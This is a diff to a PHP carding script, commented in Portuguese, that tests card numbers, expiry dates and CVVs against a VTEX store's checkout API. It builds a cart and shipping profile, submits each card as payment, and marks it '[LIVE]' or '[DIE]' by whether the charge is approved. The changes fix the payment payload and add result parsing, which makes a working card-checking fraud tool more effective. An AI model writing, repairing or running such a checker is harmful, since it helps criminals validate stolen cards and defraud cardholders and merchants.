@@ -45,6 +45,11 @@ $cc_mes = trim($dados_cc[1]);
 $cc_ano = trim($dados_cc[2]);
 $cc_cvv = trim($dados_cc[3]);
 
+if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão inválido: {$cc_num}</span>";
+    exit;
+}
+
 $cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';
 
 function requisicao_vtex($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
@@ -73,7 +78,7 @@ function requisicao_vtex($url, $post_fields = null, $headers = [], $cookie_file 
     return ['body' => $response, 'code' => $http_code];
 }
 
-// 1. Inicializa sessão e carrinho
+// 1. Inicializa sessão e adiciona item ao carrinho
 requisicao_vtex(BASE_URL, null, [], $cookie_path);
 
 $payload_cart = [
@@ -81,8 +86,9 @@ $payload_cart = [
 ];
 $resp_cart = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $payload_cart, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 $json_cart = json_decode($resp_cart['body'], true);
+$valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
-// 2. Envia perfil e endereço
+// 2. Envia perfil e endereço de entrega
 requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/profile", [
     'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@@ -91,29 +97,65 @@ requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/shippingAddress", [
     'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 3. Envia pagamento
+// 3. Envia o pagamento com a estrutura correta (sem o wrapper paymentData)
 $payload_payment = [
-    'paymentData' => [
-        'payments' => [[
-            'paymentSystem' => '1',
-            'bin' => substr($cc_num, 0, 6),
-            'accountId' => ACCOUNT_ID,
-            'referenceValue' => $json_cart['totalizers'][0]['value'] ?? 1000,
-            'card' => [
-                'number' => $cc_num,
-                'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
-                'expirationMonth' => $cc_mes,
-                'expirationYear' => $cc_ano,
-                'cvv' => $cc_cvv
-            ]
-        ]]
-    ]
+    'payments' => [[
+        'paymentSystem' => '1',
+        'bin' => substr($cc_num, 0, 6),
+        'accountId' => ACCOUNT_ID,
+        'referenceValue' => $valor_total,
+        'value' => $valor_total,
+        'installments' => 1,
+        'hasInterest' => false,
+        'card' => [
+            'number' => $cc_num,
+            'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
+            'expirationMonth' => $cc_mes,
+            'expirationYear' => $cc_ano,
+            'cvv' => $cc_cvv
+        ]
+    ]]
 ];
 
 $resp_payment = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
-// Exibe o retorno bruto da VTEX para diagnóstico exato
-$resposta_crua = htmlspecialchars($resp_payment['body']);
-echo "<span class='text-yellow-400 font-bold'>[DEBUG HTTP {$resp_payment['code']}]</span> <span class='text-slate-300'>Cartão: {$cc_num} | Resposta: {$resposta_crua}</span>";
+$json_final = json_decode($resp_payment['body'], true);
+
+$codigo = "14";
+$mensagem = "Transação não autorizada / Recusado";
+$aprovado = false;
+
+// Análise do resultado da transação
+if (isset($json_final['paymentData']['transactions'])) {
+    foreach ($json_final['paymentData']['transactions'] as $transaction) {
+        foreach ($transaction['payments'] as $payment) {
+            $status = $payment['status'] ?? '';
+            if ($status === 'approved' || $status === 'completed') {
+                $aprovado = true;
+                $codigo = "54";
+                $mensagem = "Transação Aprovada com Sucesso";
+                break 2;
+            } else if (isset($payment['lastMessage']) && !empty($payment['lastMessage'])) {
+                $mensagem = $payment['lastMessage'];
+            }
+        }
+    }
+}
+
+if (!$aprovado && isset($json_final['messages']) && !empty($json_final['messages'])) {
+    foreach ($json_final['messages'] as $msg) {
+        if (isset($msg['text'])) {
+            $mensagem = $msg['text'];
+            break;
+        }
+    }
+}
+
+// Exibição do resultado final no painel
+if ($aprovado || $codigo == "54") {
+    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
+} else {
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
+}
 ?>
